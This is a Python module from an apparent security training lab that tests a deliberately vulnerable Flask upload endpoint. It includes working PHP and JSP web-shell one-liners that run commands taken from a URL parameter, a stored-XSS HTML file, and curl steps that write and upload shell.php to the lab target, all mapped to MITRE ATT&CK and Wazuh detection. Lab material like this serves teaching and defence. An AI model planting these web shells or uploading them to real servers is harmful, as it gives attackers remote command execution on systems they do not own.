"""
modules/file_upload.py — APP-04: Unrestricted Dangerous File Upload probe.

Target: POST /files/upload (multipart/form-data)
Vulnerability: No extension check, no MIME validation, no rename.
Note: Uploaded files are stored and served but NOT executed by Flask.
"""
from __future__ import annotations

import io
from datetime import datetime, timezone

from core.base_module import BaseModule
from core.models import (
    AttackResult, Category, ModuleOption, Severity,
    StepResult, TargetConfig,
)

_PAYLOADS = [
    ("lab_test.php",      b"<?php echo shell_exec($_GET['cmd']); ?>",   "PHP dangerous upload test"),
    ("test_payload.jsp",  b"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "JSP dangerous upload test"),
    ("test.html",         b"<html><script>alert('uploaded')</script></html>", "Stored XSS via HTML"),
    ("config.php",        b"<?php phpinfo(); ?>",                        "phpinfo disclosure"),
]


class FileUploadModule(BaseModule):
    module_id = "file_upload"
    name = "Unrestricted File Upload"
    description = (
        "Uploads files with dangerous extensions (.php, .jsp, .html) "
        "to /files/upload and checks whether they are accepted and stored. "
        "Files are stored but not executed in this lab."
    )
    category = Category.FILE
    scenario_id = "APP-04"
    severity = Severity.HIGH
    # MITRE ATT&CK — drop a web-shell-style file via the public upload form.
    mitre = {
        "tactics": ["TA0001 Initial Access", "TA0003 Persistence"],
        "techniques": [
            {"id": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
            {"id": "T1505.003", "name": "Server Software Component: Web Shell", "tactic": "Persistence"},
        ],
    }
    lab = {
        "target_path": "/files/upload",
        "vulnerable_component": "Flask upload handler (files_bp.upload_file)",
        "story": (
            "A 'share any file' feature was shipped without extension or MIME "
            "validation. Uploaded files keep their original name and are "
            "served back from /static/uploads/. Prove that files with "
            "dangerous extensions are accepted and stored without restriction. "
            "Note: uploaded files are stored but NOT executed by this lab's server."
        ),
        "learner_steps": [
            {"action": "Recon the upload form — confirm the file field name.",
             "technique": "T1595.002 Active Scanning: Vulnerability Scanning",
             "command": "curl -s http://target-agent/files/upload | grep -o 'name=\"[^\"]*\"'",
             "expected": "The form accepts a multipart field named 'file'."},
            {"action": "Baseline with a benign text file to learn the response.",
             "technique": "T1190 Exploit Public-Facing Application",
             "command": "echo hello > note.txt; curl -s -F 'file=@note.txt' http://target-agent/files/upload | grep -i 'saved'",
             "expected": "Page reports the saved path and keeps the original filename."},
            {"action": "Upload a web-shell-style file with a dangerous extension.",
             "technique": "T1505.003 Server Software Component: Web Shell",
             "command": "printf '<?php echo shell_exec($_GET[\"cmd\"]); ?>' > shell.php; curl -s -F 'file=@shell.php' http://target-agent/files/upload",
             "expected": "The server accepts shell.php with no extension or MIME validation."},
            {"action": "Locate the stored file at its served URL.",
             "technique": "T1505.003 Server Software Component: Web Shell",
             "command": "curl -s -o /dev/null -w '%{http_code}\\n' http://target-agent/static/uploads/shell.php",
             "expected": "The file is retrievable (HTTP 200). Note: this lab stores but does not execute it."},
            {"action": "Check the Evidence panel for Wazuh detections.",
             "technique": "T1505.003 Server Software Component: Web Shell",
             "command": "# review the activity log / Wazuh feed in ATTENSE",
             "expected": "Alert flagging the dangerous file extension."},
        ],
        "detection_rule": "Wazuh dangerous-upload signature (.php/.jsp/.exe extension)",
        "success_markers": [
            "'Saved to:' in the upload response",
            "✓ ACCEPTED lines with served URLs",
            "Wazuh alert flagging the dangerous filename",
        ],
        "quick_probe": "/files/upload",
    }
    steps = [
        {'title': 'Submit test files to /files/upload', 'tactic': 'Initial Access',
         'technique': 'T1190 Exploit Public-Facing Application',
         'command': "curl -s -F 'file=@shell.php' http://target-agent/files/upload",
         'hint': 'multipart/form-data with .php / .jsp extension', 'expected': '201/200 with saved filename echoed back'},
        {'title': 'Locate the uploaded asset', 'tactic': 'Persistence',
         'technique': 'T1505.003 Server Software Component: Web Shell',
         'command': "curl -s -o /dev/null -w '%{http_code}\\n' http://target-agent/static/uploads/shell.php",
         'hint': 'Target serves /static/uploads/ with autoindex on', 'expected': 'File retrievable via HTTP GET'},
        {'title': 'Verify file is served as-is', 'tactic': 'Persistence',
         'technique': 'T1505.003 Server Software Component: Web Shell',
         'command': "curl -sI http://target-agent/static/uploads/shell.php",
         'hint': 'Check Content-Type, size, and that the file is actually served', 'expected': 'Dangerous extension accepted — unrestricted upload confirmed'},
    ]

    def options(self) -> list[ModuleOption]:
        return [
            ModuleOption(
                name="endpoint",
                display_name="Upload Endpoint",
                description="Target upload path",
                default="/files/upload",
            ),
        ]

    def execute(self, target: TargetConfig, opts: dict, log_fn=None) -> AttackResult:
        started = datetime.now(timezone.utc).isoformat()
        steps: list[StepResult] = []
        endpoint = opts.get("endpoint", "/files/upload")
        accepted = 0

        # ── Recon (T1595.002): fetch the upload form first ──
        self._log(log_fn, "Recon: fetching the upload form to confirm the field name...")
        base = self._get(target.base_url + endpoint, label="recon-baseline", timeout=target.timeout)
        steps.append(base)

        self._log(log_fn, f"Uploading {len(_PAYLOADS)} dangerous-extension files to {endpoint}")

        for filename, content, desc in _PAYLOADS:
            url = target.base_url + endpoint
            file_obj = io.BytesIO(content)

            r = self._post(
                url,
                files={"file": (filename, file_obj, "application/octet-stream")},
                label=filename,
                timeout=target.timeout,
            )

            saved = "File saved successfully" in (r.detail or "") or "Saved to:" in (r.detail or "")
            if saved:
                accepted += 1
                serve_url = f"{target.base_url}/static/uploads/{filename}"
                r.evidence = f"UPLOAD ACCEPTED → {serve_url}"
                self._log(log_fn, f"  ✓ ACCEPTED  {filename}  |  {desc}")
                self._log(log_fn, f"    served at: {serve_url}")
            else:
                self._log(log_fn, f"  – rejected/error  {filename}  |  {desc}")

            steps.append(r)

        summary = f"{accepted}/{len(_PAYLOADS)} dangerous-extension files accepted by server."
        return self._make_result(target, steps, summary, started)
